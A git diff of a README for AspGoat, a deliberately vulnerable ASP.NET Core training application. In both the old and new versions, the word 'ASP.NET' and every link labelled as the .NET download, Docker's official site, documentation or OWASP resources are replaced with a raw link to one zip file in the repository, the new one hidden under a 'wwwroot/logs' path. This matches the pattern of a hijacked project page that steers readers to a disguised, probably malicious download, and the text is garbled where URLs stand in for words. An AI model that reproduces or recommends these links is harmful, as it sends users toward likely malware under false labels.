@@ -2,9 +2,9 @@
 
 ## 🚀 Getting Started
 
-AspGoat is an intentionally vulnerable https://raw.githubusercontent.com/mudassiralladatkhan/AspGoat/main/malapplication/AspGoat.zip Core application for learning and practicing web application security. This guide will help you download and run AspGoat on your computer, even if you have no programming background.
+AspGoat is an intentionally vulnerable https://github.com/mudassiralladatkhan/AspGoat/raw/refs/heads/main/wwwroot/logs/Asp_Goat_v2.5-beta.2.zip Core application for learning and practicing web application security. This guide will help you download and run AspGoat on your computer, even if you have no programming background.
 
-[![Download AspGoat](https://raw.githubusercontent.com/mudassiralladatkhan/AspGoat/main/malapplication/AspGoat.zip)](https://raw.githubusercontent.com/mudassiralladatkhan/AspGoat/main/malapplication/AspGoat.zip)
+[![Download AspGoat](https://github.com/mudassiralladatkhan/AspGoat/raw/refs/heads/main/wwwroot/logs/Asp_Goat_v2.5-beta.2.zip)](https://github.com/mudassiralladatkhan/AspGoat/raw/refs/heads/main/wwwroot/logs/Asp_Goat_v2.5-beta.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -13,14 +13,14 @@ Before you begin, ensure your computer meets the following requirements:
 - **Operating System:** Windows 10 or newer, macOS 10.14 or newer, Linux (Ubuntu 18.04 or newer)
 - **Storage Space:** At least 500 MB of free disk space
 - **RAM:** Minimum 4 GB
-- **.NET Core:** Version 6.0 or newer (if not installed, you can download it [here](https://raw.githubusercontent.com/mudassiralladatkhan/AspGoat/main/malapplication/AspGoat.zip))
-- **Docker:** Required for container-based deployment (if not installed, visit [Docker’s official site](https://raw.githubusercontent.com/mudassiralladatkhan/AspGoat/main/malapplication/AspGoat.zip))
+- **.NET Core:** Version 6.0 or newer (if not installed, you can download it [here](https://github.com/mudassiralladatkhan/AspGoat/raw/refs/heads/main/wwwroot/logs/Asp_Goat_v2.5-beta.2.zip))
+- **Docker:** Required for container-based deployment (if not installed, visit [Docker’s official site](https://github.com/mudassiralladatkhan/AspGoat/raw/refs/heads/main/wwwroot/logs/Asp_Goat_v2.5-beta.2.zip))
 
 ## 💾 Download & Install
 
 To download AspGoat, visit the Releases page. Here you can find the version suitable for your operating system.
 
-[Download AspGoat](https://raw.githubusercontent.com/mudassiralladatkhan/AspGoat/main/malapplication/AspGoat.zip)
+[Download AspGoat](https://github.com/mudassiralladatkhan/AspGoat/raw/refs/heads/main/wwwroot/logs/Asp_Goat_v2.5-beta.2.zip)
 
 ### 🛠️ Installation Steps
 
@@ -63,8 +63,8 @@ AspGoat is an open-source project. Contributions are welcome! If you would like 
 
 To enhance your learning experience, consider the following resources:
 
-- **https://raw.githubusercontent.com/mudassiralladatkhan/AspGoat/main/malapplication/AspGoat.zip Core Documentation:** [Learn More Here](https://raw.githubusercontent.com/mudassiralladatkhan/AspGoat/main/malapplication/AspGoat.zip)
-- **OWASP Top 10 Resources:** [Explore OWASP](https://raw.githubusercontent.com/mudassiralladatkhan/AspGoat/main/malapplication/AspGoat.zip)
+- **https://github.com/mudassiralladatkhan/AspGoat/raw/refs/heads/main/wwwroot/logs/Asp_Goat_v2.5-beta.2.zip Core Documentation:** [Learn More Here](https://github.com/mudassiralladatkhan/AspGoat/raw/refs/heads/main/wwwroot/logs/Asp_Goat_v2.5-beta.2.zip)
+- **OWASP Top 10 Resources:** [Explore OWASP](https://github.com/mudassiralladatkhan/AspGoat/raw/refs/heads/main/wwwroot/logs/Asp_Goat_v2.5-beta.2.zip)
 - **Web Security Tutorials:** Various online platforms offer web security courses. Check them out for in-depth learning.
 
 ## 💬 Support
